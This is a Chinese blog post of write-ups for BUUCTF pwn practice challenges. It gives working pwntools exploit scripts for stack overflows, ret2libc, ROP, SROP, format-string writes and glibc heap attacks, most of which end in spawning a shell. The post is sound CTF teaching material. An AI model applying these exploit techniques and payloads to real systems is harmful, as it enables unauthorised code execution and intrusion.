---
title: BUUCTF Pwn 练习记录
date: 2019-12-14 21:46:20
tags:
  - 整数溢出
  - 栈漏洞
  - fsb
  - 堆漏洞
categories:
  - 二进制安全
---

从今天起，我也是 Pwn 🐕 了。

<!--more-->

## Part I

### test_your_nc

nc 直接连，`cat flag`。

### rip

栈溢出，可直接覆盖返回地址，注意 64 位：

```python
payload = 'a'*(0xf+8) + p64(elf.symbols['fun'])
s(payload)
```

### warmup_csaw_2016

和上题其实一样，程序中存在后门，直接返回过去。

```python
payload = 'a'*(0x40+8) + p64(0x40060d)
s(payload)
```

### pwn1_sctf_2016

直接运行几次或者源码审计可以发现是将输入的 `I` 替换为 `you`，其余的其实和上面一样：

```python
payload = 'I'*(0x3c // 3)+'a'*4+p32(elf.symbols['get_flag'])
sl(payload)
```

### ciscn_2019_c_1

开启了 NX 保护，并且有未限制长度的 `gets`，基本上可以确定是 ROP 栈溢出。IDA 搜一下 string，可以发现有 libc 可以用，考虑 ret2libc。

```python
pop_rdi = 0x400c83

def send(payload):
    ru('!\n')
    sl('1')
    ru('ed\n')
    sl(payload)

payload = flat('a'*0x58,pop_rdi,elf.got['__libc_start_main'],elf.plt['puts'],elf.sym['main'])
send(payload)

ru('@\n')
leak = uu64(r(6))
system,binsh = ret2libc(leak,'__libc_start_main')

payload = flat('a'*0x58,pop_rdi,binsh,system)
send(payload)
```

### ciscn_2019_n_1

依然是最简单的无保护 `gets` 并且程序中有 `system("cat /flag")`，找到后者地址返回过去即可。

```python
cat_flag = 0x4006be

def send(payload):
    ru('number.\n')
    sl(payload)

payload = flat('a'*0x38, cat_flag)
send(payload)
```

### ciscn_2019_en_2

和上上题一样。

## Part II

### [OGeek2019]babyrop

```c
int __cdecl main()
{
  int buf; // [esp+4h] [ebp-14h]
  char v2; // [esp+Bh] [ebp-Dh]
  int fd; // [esp+Ch] [ebp-Ch]

  sub_80486BB();
  fd = open("/dev/urandom", 0);
  if (fd> 0 )
    read(fd, &buf, 4u);
  v2 = sub_804871F(buf);
  sub_80487D0(v2);
  return 0;
}
```

`main` 中 `sub_80486BB` 用于初始化，然后将一个随机数传入 `sub_804871F`：

```c
int __cdecl sub_804871F(int a1)
{
  size_t v1; // eax
  char s; // [esp+Ch] [ebp-4Ch]
  char buf[7]; // [esp+2Ch] [ebp-2Ch]
  unsigned __int8 v5; // [esp+33h] [ebp-25h]
  ssize_t v6; // [esp+4Ch] [ebp-Ch]

  memset(&s, 0, 0x20u);
  memset(buf, 0, 0x20u);
  sprintf(&s,"%ld", a1);
  v6 = read(0, buf, 0x20u);
  buf[v6 - 1] = 0;
  v1 = strlen(buf);
  if (strncmp(buf, &s, v1) )
    exit(0);
  write(1,"Correct\n", 8u);
  return v5;
}
```

这里的 `a1` 就是传入的随机数，然后要求我们的输入和随机数经过 `strncmp` 比较后完全相同，我们可以输入 `\x00` 使得 `strlen` 函数返回 0，从而使得 `strncmp` 函数只比较 0 个字节，那么就能绕过这里的 `exit(0)`，并返回 `v5`。注意到这里的返回值 `v5` 在 `ebp-0x25`，距离我们能控制的位于 `ebp-0x2c` 的变量 `buf` 相差 `0x7`，小于这里 `read` 的长度限制 `0x20`，因此可以通过栈溢出控制 `v5` 的值，从而控制 `main` 中的 `v2`。

随后，`v2` 会被传入 `sub_80487D0`:

```c
ssize_t __cdecl sub_80487D0(char a1)
{
  ssize_t result; // eax
  char buf; // [esp+11h] [ebp-E7h]

  if (a1 == 127)
    result = read(0, &buf, 0xC8u);
  else
    result = read(0, &buf, a1);
  return result;
}
```

`a1` 就是我们可以控制的 `v2`，也就是说这里可以向 `buf` 写入的数据长度也是我们能控制的，那么我们希望它尽可能大，也就是等于 `0xff`。那么在上一个函数中我们就需要令 `v5` 为 `0xff`，结合上面的绕过，可以输入 `'\x00' + 6*'a' + '\xff'` 来达到这个目的。最后 `ret2libc` 即可。

```python
def send1():
    payload = flat('\x00','a'*6,'\xff')
    sl(payload)
    ru('Correct\n')

send1()
main = 0x8048825
payload = flat('a'*(0xe7+4),elf.plt['write'],main,1,elf.got['__libc_start_main'],4)
sl(payload)

leak = u32(r(4))
system,binsh = ret2libc(leak,'__libc_start_main')

send1()
payload = flat('a'*(0xe7+4),system,'a'*4,binsh)
p.sendline(payload)
```

### babyheap_0ctf_2017

```
===== Baby Heap in 2017 =====
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
```

分配内存使用了 `calloc`，每次分配会先清空一下这块内存，大小限制是 4096B。填充时直接读取用户输入，没有检查长度，因此可以堆溢出。除了 canary 外保护全开，因此考虑泄露 libc。如何泄露？

当只有一个 small bin/large bin 被释放时，其 `fd` 与 `bk` 指向 `main_arena` 中的地址，而后者是 libc 的一个全局变量，因此可以通过它泄露出 libc 基址。

首先分配 4 个 fast chunk 和 1 个 small chunk（不妨分别称为 `a,b,c,d,e`），然后释放 `b`，它将被加入 fast bin 顶部。此时再释放 `c`，那么 `c` 也会加入 fast bin 顶部，并且它的 `fd` 指向 `b`。此时有：`freelist->c->b`。

```python
for i in range(4):
    alloc(0x10) # a0,b1,c2,d3
alloc(0x80) # e4
free(1) # b
free(2) # c
```

这样就可以进行 fastbin attack。利用 `Fill` 堆溢出修改 `c` 的 `fd` 为 `e` 的地址（我们需要从未被释放的 `a` 开始填充，所以刚才不是从 `a` 开始释放），随后第一次 `Allocate` 拿到 `c`，第二次 `Allocate` 就能拿到 `e`。

```python
# c->fd = e
payload = flat([0,0,0,0x21,0,0,0,0x21,'\x80'])
fill(0, payload)
```

注意这里 payload 的前三个 `0` 用于填充 `a` 中 `0x10` 字节的用户数据和 `b` 中 `0x8` 字节的 `prev_size` 字段，后面同理。`0x21` 是 `a/b/c/d` 的 `chunk_size`，`0x80` 是 `e` 的地址低 8 位，都可以通过 gdb 调试得到。

> 注：`0x21` 低位的 `1` 表示 `PREV_INUSE`，这和 fast bin 中 chunk 的 P 位不变是一致的。

然而这里存在一个安全检查：

```c
#define fastbin_index(sz) \
  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)

if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
{
    errstr = "malloc(): memory corruption (fast)";
errout:
    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
    return NULL;
}
```

检查我们拿到的 chunk 的大小是否在对应索引的 fast bin 范围内。所以我们还需要修改 `e` 的 `chunk_size` 字段，方法同样是堆溢出。

```python
# e->chunk_size = 0x21
payload = flat([0,0,0,0x21])
fill(3, payload)
```

这里通过 `d` 溢出到 `e` 的 `chunk_size` 并覆盖上了 `0x21`，gdb 调试得到其索引为 `2`。

修改完成后才可以进行两次 `alloc(0x10)` 从而拿到 `e`。拿到 `e` 后再释放掉它就可以获得其 `fd` 与 `bk`，但这里有两个问题：

1. 前面对其 `chunk_size` 的修改会导致释放时 `e` 进入 fast bin，拿不到 `fd` 和 `bk`。
2. `e` 被释放后与 top chunk 相邻，必定会被合并。
3. `fd` 和 `bk` 到底指向哪里？

解答：

1. 把 `e` 的 `chunk_size` 恢复即可。
2. 释放 `e` 前再多申请一个 small chunk 使得 `e` 不与 top chunk 相邻。
3. `e` 被释放后进入 unsorted bin，所以其 `fd` 与 `bk` 都指向 unsorted bin 的链表头，注意其地址到 libc 基址的偏移是固定的 `0x3c4b78`。

```python
# e->chunk_size = 0x91
payload = flat([0,0,0,0x91])
fill(3, payload)
alloc(0x80) # f5
free(4) # e, e->fd = unsorted_head

base = u64(dump(2)[:8])-0x3c4b78
```

最后的 `dump(2)` 就是打印索引为 `2` 的 chunk，也就是 `e`，从而得到 `e` 的 `fd` 和 `bk`。

之后，再次使用 fast bin attack 将 libc 中函数，例如 `__malloc_hook` 放入 fast bin，然后用 `malloc` 返回给我们，就可以实现类似 GOT 劫持的效果。`__malloc_hook` 只要非空，就会在 `malloc` 时被调用，我们让它指向 `one_gadget` 找到的一个 gadget 即可，比如可以用距离 libc 基址 0x4526a 的 gadget。

但是同样的，我们需要绕过上面的安全检查。幸运的是，该检查对于对齐没有任何要求。通过 gdb 调试我们发现在 `__malloc_hook` 附近的 `_IO_wide_data_0+304` 位置其高位字节为 `7f` 而低位字节含有连续的 `00`，因此可以通过增加一些偏移获得 `0x7f` 这个数值作为 `chunk_size`，恰好能通过检查。

如下：

```
pwndbg> x/32xg (long long)(&main_arena)-0x40
0x7f16d95deae0 <_IO_wide_data_0+288>:    0x0000000000000000    0x0000000000000000
0x7f16d95deaf0 <_IO_wide_data_0+304>:    0x00007f16d95dd260    0x0000000000000000
0x7f16d95deb00 <__memalign_hook>:    0x00007f16d929fe20    0x00007f16d929fa00
0x7f16d95deb10 <__malloc_hook>:    0x0000000000000000    0x0000000000000000
```

我们加 13 字节偏移（循环右移），成功伪造 `chunk_size`：

```
pwndbg> x/32xg (long long)(&main_arena)-0x40+0xd
0x7f16d95deaed <_IO_wide_data_0+301>:    0x16d95dd260000000    0x000000000000007f
0x7f16d95deafd:    0x16d929fe20000000    0x16d929fa0000007f
0x7f16d95deb0d <__realloc_hook+5>:    0x000000000000007f    0x0000000000000000
0x7f16d95deb1d:    0x0000000000000000    0x0000000000000000
```

`0x7f` 对应的 `malloc` 请求大小大约是 `0x60`。现在，freelist 顶部是 `e`，于是 `alloc(0x60)` 就会分配总大小为 `0x71`、起点与 `e` 相同、且索引为 `4` 的 chunk `g`，这时再 `free` 掉 `g` 就会使得 `g` 位于 freelist 顶部。

```python
alloc(0x60) # g4
free(4) # g
```

接下来修改索引为 `2` 的 chunk 的 `fd`（实际就是为了修改 `e` 或者说 `g` 的 `fd`）指向 `_IO_wide_data_0+301` 地址，然后第一次 `Allocate` 得到 `g` 位于索引 `5`，第二次 `Allocate` 得到指向 `_IO_wide_data_0+301` 的指针，位于索引 `6`。

```python
# g->fd = _IO()
payload = p64(base+0x3c4aed)
fill(2, payload)

alloc(0x60) # g5
alloc(0x60) # _IO()6
```

而由上面的 gdb 分析可知得到的指针位于 `0xaed`，`__malloc_hook` 位于 `0xb10`（PIE 下低 12 位固定），相差 `0x13`。因此填充 `0x13` 字节的 padding 后再放上 getshell 的 gadget 地址即可。

```python
# _IO() + 13 == __malloc_hook(), one_gadget
payload = flat(['\x00'*0x13, base+0x4526a])
fill(6, payload)
```

最后不要忘记再申请一次任意大小内存以调用 `__malloc_hook`。完整 exp，注意最后一次 alloc 返回得有点慢，`recvuntil` 最好加一个 `timeout`：

```python
def alloc(size):
    sl('1')
    sla(':', str(size))
    ru(':', timeout=1)

def fill(idx, data):
    sl('2')
    sla(':', str(idx))
    sla(':', str(len(data)))
    sa(':', data)
    ru(':')

def free(idx):
    sl('3')
    sla(':', str(idx))
    ru(':')

def dump(idx):
    sl('4')
    sla(':', str(idx))
    ru(': \n')
    data = p.ru('\n')
    ru(':')
    return data


for i in range(4):
    alloc(0x10) # a0,b1,c2,d3
alloc(0x80) # e4
free(1) # b
free(2) # c

# c->fd = e
payload = flat(0,0,0,0x21,0,0,0,0x21,'\x80')
fill(0, payload)

# e->chunk_size = 0x21
payload = flat(0,0,0,0x21)
fill(3, payload)

alloc(0x10) # c1
alloc(0x10) # e2

# e->chunk_size = 0x91
payload = flat(0,0,0,0x91)
fill(3, payload)
alloc(0x80) # f5
free(4) # e, e->fd = unsorted_head

base = u64(dump(2)[:8])-0x3c4b78
leak('libc_base',base)

alloc(0x60) # g4
free(4) # g

# g->fd = _IO()
payload = p64(base+0x3c4aed)
fill(2, payload)

alloc(0x60) # g5
alloc(0x60) # _IO()6

# _IO() + 0x13 == __malloc_hook(), one_gadget
payload = flat('\x00'*0x13,p64(base+0x4526a))
fill(6, payload)

# malloc() -> __malloc_hook()
alloc(1)
```

### get_started_3dsctf_2016

本地运行脚本：

```python
get_flag = 0x80489a0
payload = flat('a'*0x38,get_flag,'a'*4,0x308cd64f,0x195719d1)
sl(payload)

print r()
```

本来这样是可以直接读取 flag 的，但是远程不行。因此远程运行时换了一种更具难度的方法，就是调用 `mprotect` 修改 `bss` 段权限使得其可执行，随后写入 shellcode。

需要注意 `mprotect` 第二个参数要求页对齐，第三个参数为 `7` 表示 `rwx`。修改完成后从标准输入读入 shellcode，写入 `bss_base` 后返回到 `bss_base` 处执行。

```python
pop3 = 0x80483b8
got_base = 0x80eb000
bss_base = elf.bss()
payload = flat('a'*0x38,elf.sym['mprotect'],pop3,got_base,0x1000,7,elf.sym['read'],pop3,0,bss_base,0x200,bss_base)
sl(payload)
sleep(1)
sl(asm(shellcraft.sh()))
```

### not_the_same_3dsctf_2016

和上面 get_started 做法一样。我怀疑 BUU 上一题在服务器上放错了二进制文件，也放了这一题的，所以第一个脚本才会无效。

### [第五空间 2019 决赛]PWN5

长度限制无法栈溢出，但是存在明显的格式化字符串漏洞。通过 `aaaa %08x %08x ...` 可以判断偏移为 10。

然后利用 `%10$n` 修改 `0x804c044` 地址（IDA 得到）处的值即可，最后输入 `passwd` 需要与已成功输出的字符数相等。当然，也可以直接修改 `atoi` 的 GOT 地址为 `system` 的 PLT 地址。

```python
sla(':', p32(0x804c044) + '%10$n')
sla(':', '4')
```

### ciscn_2019_n_8

IDA 可知需要让 var 的下标为 13 的元素（也就是第 14 个）等于 17，直接按照需求写脚本即可：

```python
sl(p32(17)*14)
```

### babyfengshui_33c3_2016

本题源码大致如下，开启了 canary 和 NX：

```c
void __cdecl __noreturn main()
{
  char v0; // [esp+3h] [ebp-15h]
  int action; // [esp+4h] [ebp-14h]
  size_t input; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  alarm(0x14u);
  while (1)
  {
    puts("0: Add a user");
    puts("1: Delete a user");
    puts("2: Display a user");
    puts("3: Update a user description");
    puts("4: Exit");
    printf("Action:");
    if (__isoc99_scanf("%d", &action) == -1 )
      break;
    if (!action)
    {
      printf("size of description:");
      __isoc99_scanf("%u%c", &input, &v0);
      add(input);
    }
    if (action == 1)
    {
      printf("index:");
      __isoc99_scanf("%d", &input);
      delete((unsigned __int8)input);
    }
    if (action == 2)
    {
      printf("index:");
      __isoc99_scanf("%d", &input);
      display((unsigned __int8)input);
    }
    if (action == 3)
    {
      printf("index:");
      __isoc99_scanf("%d", &input);
      update(input);
    }
    if (action == 4)
    {
      puts("Bye");
      exit(0);
    }
    if ((unsigned __int8)total_users > 0x31u )
    {
      puts("maximum capacity exceeded, bye");
      exit(0);
    }
  }
  exit(1);
}
```

我们重点关注可能存在漏洞的 `add` 和 `update`，首先是 `add`：

```c
_DWORD *__cdecl add(size_t size)
{
  void *desc; // ST24_4
  _DWORD *user; // ST28_4

  desc = malloc(size);
  memset(desc, 0, size);
  user = malloc(0x80u);
  memset(user, 0, 0x80u);
  *user = desc;
  users[(unsigned __int8)total_users] = user;
  printf("name:");
  read_name((char *)users[(unsigned __int8)total_users] + 4, 124);
  update(++total_users - 1);
  return user;
}
```

这里可以大致了解到 `user` 结构体大约长这样：

```c
struct user {
    char *description;
    char name[124];
};
```

注意 `descrption` 是 `user` 开始的地方。

随后发现 `update` 中存在一处防护措施：

```c
unsigned int __cdecl sub_8048724(unsigned __int8 index)
{
  char v2; // [esp+17h] [ebp-11h]
  int len; // [esp+18h] [ebp-10h]
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  if (index < (unsigned __int8)total_users && users[index] )
  {
    len = 0;
    printf("text length:");
    __isoc99_scanf("%u%c", &len, &v2);
    if ((char *)(len + *(_DWORD *)users[index]) >= (char *)users[index] - 4 )
    {
      puts("my l33t defenses cannot be fooled, cya!");
      exit(1);
    }
    printf("text:");
    read_name(*(_DWORD *)users[index], len + 1);
  }
  return __readgsdword(0x14u) ^ v4;
}
```

这里其实是判断当前 `user->description` 加上输入的字符串长度是否会超过 `user` 起始地址 - 4 的位置，目的很明显是为了防止堆溢出。预期内存布局是：

```
 --------
| Desc0  |
 -------- <- user0
| &Desc0 |
 --------
| name0  |
 --------
| Desc1  |
 -------- <- user1
| &Desc1 |
 --------
| name1  |
 --------
| Desc2  |
 -------- <- user2
| &Desc2 |
 --------
| name2  |
 --------
```

然而，我们还拥有删除用户的功能。假如我们删除第 0 个用户，那么他拥有的空间就被 `free()` 了。这时我们新增用户，由于 `desc` 长度可控，我们可以控制其长度让它恰好分配到原来第 0 个用户的空间，从 `Desc0` 一直到 `name0` 结束。那么此时：

```
 --------
|        |
|        |
| Desc3  |
|        |
|        |
 --------
| Desc1  |
 -------- <- user1
| &Desc1 |
 --------
| name1  |
 --------
| Desc2  |
 -------- <- user2
| &Desc2 |
 --------
| name2  |
 -------- <- user3
| &Desc3 |
 --------
| name3  |
 --------
```

不难发现，即使有上述防护措施的限制，我们依然可以溢出到 `user1` 并覆盖其中数据。如果把 libc 中函数的 GOT 表地址放进去，然后 `display` 函数打印出来，就能泄露 libc 地址。然后进行 GOT 劫持即可 getshell。

需要注意的是，上图中 `Desc1` 前和 `&Desc1` 前都有 8 字节 chunk header，覆盖时需要考虑它们占的 16B。此外，`Desc0+user0` 原本所占的空间实际上是 `0x8+0x80+0x8+0x80`，而 `Desc3` 申请 `0x100` 字节时实际占 `0x8+0x100`，前者比后者多出空闲的 `0x8` 字节，也需要考虑。因此计算偏移 `0x100+0x8+0x8+0x80+0x8=0x198`。

放上 `0x198` 字节的 padding 后，就可以把 `free` 的 GOT 地址放在 `&Desc1` 处，此时打印出来的就是 `free` 的 GOT 地址，从而泄露出 libc。这时再利用更新功能用 `system.plt` 覆盖 `free.got`，那么执行 `free` 时就会执行 `system`。此时还差一个参数 `/bin/sh`，我们不妨放在 `Desc2` 处，那么在删除 `user2` 时，有源码：

```c
unsigned int __cdecl delete(unsigned __int8 index)
{
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if (index < (unsigned __int8)total_users && users[index] )
  {
    free(*(void **)users[index]);
    free(users[index]);
    users[index] = 0;
  }
  return __readgsdword(0x14u) ^ v2;
}
```

这里就会执行 `free(address of /bin/sh)`，实际上就是 `system('/bin/sh')`。

```python
def add(max_len, desc_len, text):
    sla('Action:', '0')
    sla('description:', str(max_len))
    sla('name:', 'aaaa')
    sla('length:', str(desc_len))
    sla('text:', text)

def delete(index):
    sla('Action:', '1')
    sla('index:', str(index))

def display(index):
    sla('Action:', '2')
    sla('index:', str(index))

def update(index, desc_len, text):
    sla('Action:', '3')
    sla('index:', str(index))
    sla('length:', str(desc_len))
    sla('text:', text)

add(0x80,0x80,'a'*0x80)
add(0x80,0x80,'b'*0x80)
add(0x8,0x8,'/bin/sh\x00')
delete(0)

add(0x100,0x19c,'a'*0x198+p32(elf.got['free']))
display(1)
ru('tion:')
free = u32(r(4))
leak('free',free)
system,binsh = ret2libc(free,'free')

update(1,4,p32(system))
delete(2)
```

### ciscn_2019_s_3

本题代码很少，注意到 `gadgets` 函数中有 `mov rax, 0Fh` 和 `mov rax, 3Bh` 可以控制 `rax`，它们恰好分别对应系统调用 `sigreturn` 和 `execve`。因此本题可以围绕这两个系统调用给出两种做法。

比较难的做法是利用 `execve`，我们希望执行 `execve('/bin/sh',0,0)`，那么还需要控制 `rdi,rsi,rdx`。这里需要几个 gadgets，但是 `gadgets` 函数中的不够用，所以可以 `ret2csu`。`/bin/sh` 需要我们自己写，但只能写到栈上，因此需要通过 `write` 泄露栈地址。

我们输入的内容位于 `rbp-0x10`，那么填充 16 字节后填充 `main` 函数地址即可重启程序同时泄露栈地址，gdb 调试可知泄露位置距离我们的输入偏移量为 `0x118` 字节。

最后在栈上布置好 `/bin/sh` 字符串和 `pop_rdi` 的 gadget，准备好 `rax`，返回到 csu 末尾确保 `rbx=0` 且 `rbp=1`，将栈上 `pop rdi` 的地址给 `r12` 以便调用，随后设置 `rsi,rdx` 为 0，最后将 `/bin/sh` 的地址给 `rdi`，调用 `syscall` 即可。

```python
syscall = 0x400517
mov_rax_3b = 0x4004e2
pop_rdi = 0x4005a3
csu_1 = 0x400580
csu_2 = 0x40059a

payload = 'a'*16 + p64(elf.sym['main'])
sl(payload)
r(0x20)
stack = uu64(r(8))-0x118
leak('stack',stack)

payload = flat('/bin/sh\x00',pop_rdi,mov_rax_3b,csu_2,0,1,stack-0x18,0,0,0,csu_1,pop_rdi,stack-0x20,syscall)
sl(payload)
```

第二种方法则是 SROP。我们利用 `mov rax, 0Fh` 控制 `rax` 为 15，随后调用 `syscall`，相当于执行了一次 `sigreturn`。可以伪造 sigreturn frame 来执行 `execve('/bin/sh',0,0)`。

```python
syscall = 0x400517
mov_rax_0f = 0x4004da

payload = 'a'*16 + p64(elf.sym['vuln'])
sl(payload)
r(0x20)
stack = uu64(p.r(8))-0x118
leak('stack',stack)

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = stack
frame.rsi = 0
frame.rdx = 0
frame.rsp = stack
frame.rip = syscall

payload = flat('/bin/sh\x00'*2,mov_rax_0f,syscall) + str(frame)
sl(payload)
```

### [HarekazeCTF2019]baby_rop

发现 `main` 里有 `system`，然后还找到了 `/bin/sh` 字符串和 `pop rdi` 的 gadget，那就老办法传参就行了，就是 getshell 之后需要找一下 flag 的位置。

```python
binsh = 0x601048
pop_rdi = 0x400683

payload = flat('a'*0x18,pop_rdi,binsh,elf.plt['system'])
sl(payload)
```

### pwn2_sctf_2016

本题先会让用户设置读入数据长度，如果大于 32 则退出。由于它自己实现的 `get_n` 函数第二个参数是 `unsigned int`，很容易想到使用整数溢出来绕过这个限制，因此可以输入 `-1` 产生栈溢出漏洞。然后 ret2libc 就好。

```python
ru('read?')
sl('-1')
ru('data!')

you_said_s = 0x80486f8
payload = flat('a'*(0x2c+4),elf.plt['printf'],elf.sym['main'],you_said_s,elf.got['printf'])
sl(payload)
ru('You said:')
ru('You said:')

printf = u32(r(4))
leak('printf',printf)
system,binsh = ret2libc(printf,'printf')

ru('read?')
sl('-1')
ru('data!')
payload = flat('a'*(0x2c+4),system,'a'*4,binsh)
sl(payload)
```

### ez_pz_hackover_2016

这题要求字符串 `s` 以 `crackme\x00` 开头，随后会执行 `memcpy` 将我们的输入复制到一个 `dest` 位置。我们通过 gdb 调试可以测出其距离 ebp 距离为 22，要覆盖到返回地址则需要 26 字节。至于返回地址，题目提供了字符串 `s` 的地址，但是直接以它作为返回地址会失败，gdb 调试到 `vuln` 函数中的 `ret` 语句的时候会发现，返回地址位于 `0xffca41dc`，而我们写入的数据位于 `0xffca41c0`，相差 `0x1c`，因此还需要考虑该偏移量。

```python
ru('crash:')
ss = int(ru('\n'),16)
leak('ss',ss)

payload = 'crashme\x00'.ljust(26,'\x00') + p32(ss-0x1c) + asm(shellcraft.sh())
sl(payload)
```

### ciscn_2019_ne_5

本题有 `GetFlag` 的后门，有一个 `memcpy` 的操作，此时需要关注的偏移实际上是 `dest` 到 `ebp` 的距离。管理员密码可直接通过反编译得到。

```python
binsh = 0x80482ea
sla('password:','administrator')
sla('Exit\n:','1')
payload = flat('a'*(0x48+4),elf.plt['system'],'a'*4,binsh)
sla('info:',payload)
sla('Exit\n:','4')
```

### [HarekazeCTF2019]baby_rop2

题目给定了 libc，结合题目名可以想到 ret2libc，这里只能调用 `printf` 来打印函数 GOT 地址，其余和常规 ret2libc 相同。

```python
pop_rdi = 0x400733
payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['printf'],elf.sym['main'])
sla('name?', payload)
ru('\n')
read = uu64(r(6))
leak('read', read)
system, binsh = ret2libc(read,'read','./libc.so.6')
payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8)
sla('name?', payload)
```

### ciscn_2019_n_5

本题没有开启任何保护，因此方法多样，例如 ret2libc：

```python
sla('name\n', 'merc')
pop_rdi = 0x400713
#ret = 0x4004c9
payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['main'])
ru('me?\n')
sl(payload)
read = uu64(r(6))
leak('read',read)
sla('name\n', 'merc')
system, binsh = ret2libc(read,'read')
payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8)
sla('me?\n', payload)
```

或者更简单的 ret2shellcode：

```python
sla('name\n', asm(shellcraft.sh()))
payload = flat('a'*0x28,0x601080)
ru('me?\n')
sl(payload)
```

由于远程 libc 版本和本地二进制文件的版本不同，打远程时推荐使用 ret2shellcode，感觉这个更接近预期解。

### ciscn_2019_final_3

提供了 libc，发现是 2.27 版本的，考虑和 tcache 利用有关。

程序提供了 `add` 和 `remove` 两个功能，首先 `add` 只能创建小于 0x78 字节的 chunk，且最多创建 0x18 个 chunk。`gift` 会返回分配到的内存地址。而在 `remove` 中，`free` 之后没有将指针置 null，存在 double free。

由于题目给了 libc，我们希望能泄露 libc 地址，这就需要 tcache 中某节点的 fd 指向 libc。而我们知道，unsorted bin 指向 `main_arena` 的指针是指向 libc 的，那么能不能把这个指针给 tcache 中某节点的 fd 呢？

由于 0x78 字节的限制我们无法直接创建适合放入 unsorted bin 中的 chunk，因此需要先合并小堆块，然后修改 `chunk0` 的 `chunk_size` 把他变成一个大堆块。那么如何修改这个 `chunk_size` 字段？这就需要用到 double free，假设我们连续申请堆块申请到了 `chunk11`：

```python
chunk0 = add(0x78)
add(0x18)
for i in range(10):
    add(0x78)
```

> 注：第二次分配了 0x18 字节是 64 位下最小分配大小。这个 `chunk1` 的分配是为了让 unsorted bin 与 tcache 错位。

那么这时连续两次 `free` 掉 `chunk11`，再 `add` 回来，使得 `chunk11->fd = chunk0-0x10`，那么我们就在 `chunk0-0x10` 处伪造了一个堆块，再次 `add` 就会分配到 `chunk0-0x10`，此时填入准备好的 `prev_size` 及 `chunk_size` 即可修改 `chunk0` 大小。注意为了确保释放后进入 unsorted bin，`chunk_size` 需大于 0x400 字节。

```python
remove(11)
remove(11)
add(0x78,p64(chunk0-0x10)) # chunk11->fd = chunk0-0x10
add(0x78,p64(chunk0-0x10))
add(0x78,p64(0)+p64(0x4a1))
```

随后我们释放 `chunk0` 就会进入 unsorted bin，而释放 `chunk1` 会进入 `tcache[0]`。此时 `add` 就会得到 `chunk0`，并使得 `chunk1->fd = main_arena`，那么接下来一次 `add` 得到 `chunk1`，下一次 `add` 得到 `main_arena`，减去偏移量即 libc 基址。

```python
remove(0) # unsorted bin
remove(1) # tcache[0]
add(0x78) # chunk0; chunk1->fd = main_arena
add(0x18) # chunk1
main_arena = add(0x18)
base = main_arena - 0x3ebca0
leak('base', base)
```

最后再次利用 double free，用 `one_gadget` 覆盖 `free_hook`，再次调用 `remove` 即可。

```python
libc = ELF('./libc.so.6')
free_hook = base + libc.sym['__free_hook']
one_gadget = base + 0x10a38c

add(0x28)
remove(18)
remove(18)
add(0x28, p64(free_hook))
add(0x28, p64(free_hook))
add(0x28, p64(one_gadget))
remove(0)
```

### ciscn_2019_es_2

只能溢出 8 字节，空间太小，因此考虑栈迁移。如下布置栈：

```
ret addr
ebp-0x2c
padding
/sh\x00
/bin
ebp-0x1c
padding
system
padding
ebp-0x24
padding
padding
```

得到：

```python
sa('name?\n','a'*0x28)
ru('a'*0x28)
ebp = uu32(r(4))
leak('ebp', ebp)
payload = flat('a'*8,ebp-0x24,'a'*4,elf.plt['system'],'a'*4,ebp-0x1c,'/bin/sh\x00','a'*4,ebp-0x2c)
s(payload)
```

### roarctf_2019_easy_pwn

本题在 `write` 时存在 off_by_one 漏洞：

```c
__int64 __fastcall sub_E26(signed int a1, unsigned int a2)
{
  __int64 result; // rax

  if (a1> (signed int)a2 )
    return a2;
  if (a2 - a1 == 10)
    LODWORD(result) = a1 + 1;
  else
    LODWORD(result) = a1;
  return (unsigned int)result;
}
```

如果编辑时输入的 `size` 比创建时的 `size` 大 10，就可以多输入一个字节。这多出来的一个字节可以覆盖到下一个 chunk 的 `chunk_size` 字段，从而修改其大小，造成堆块重叠。

首先连续创建 5 个 `chunk`，其中第 0 个的大小必须以 `8` 结尾，否则只能溢出到 `prev_size` 而不是 `chunk_size`。编辑 0 中数据，触发 off_by_one 条件溢出修改 1 的大小。随后 `free(1)` 使其对应大小的 chunk 进入 unsorted bin，此时 2 的 fd 即指向 `main_arena+88`，从而可以泄露 libc。

```python
add(0x58) # 0
for i in range(4):
    add(0x60) # 1
edit(0, 0x58+10,'a'*0x58+'\xe1')
delete(1)
add(0x60) # 1
show(2) # 2
ru('content:')
main_arena = uu64(r(6)) - 88
base = main_arena - libc.sym['__malloc_hook'] - 0x10
leak('base', base)
```

接下来先绕过 fastbin 的大小检查，随后向 fd 写入 `malloc_hook` 上方的地址后申请回来，从申请到的地址出发填充 11 字节后即可用 `one_gadget` 覆盖 `__malloc_hook`。但是需要注意的是 `one_gadget` 的约束条件得不到满足，因此需要先执行 `__libc_realloc` 对 rsp 进行调整。最后用 `one_gadget` 覆盖 `__realloc_hook`。

```python
add(0x60) # 5 (2)
delete(2) # bypass fastbin check
edit(5,0x8,p64(main_arena-0x33)) # above malloc_hook
add(0x60) # 2
add(0x60) # 6
payload = flat('a'*0xb,base+0x4526a,base+libc.sym['realloc']+2)
edit(6,len(payload),payload)
add(0x18)
```

### ciscn_2019_n_3

本题 `do_new` 函数先创建 `0xc` 的 chunk，包含填充的数字、对数字的打印函数和释放函数；而如果申请的是 `string` 类型，且长度不超过 `0x400` 的话，随后还会创建一个新的 chunk，包含字符串内容、对字符串的打印函数和释放函数。

而在 `do_del` 中，`free` 后没有清空指针，存在 uaf。因此可以先申请两个堆块（总大小大于 `0xc`）然后依次释放，再申请一个大小为 `0xc` 的堆块。那么此时先会拿出 `chunk1` 的 `0xc` 这一块，再拿出 `chunk0` 的 `0xc` 这一块，后者是我们可写的。

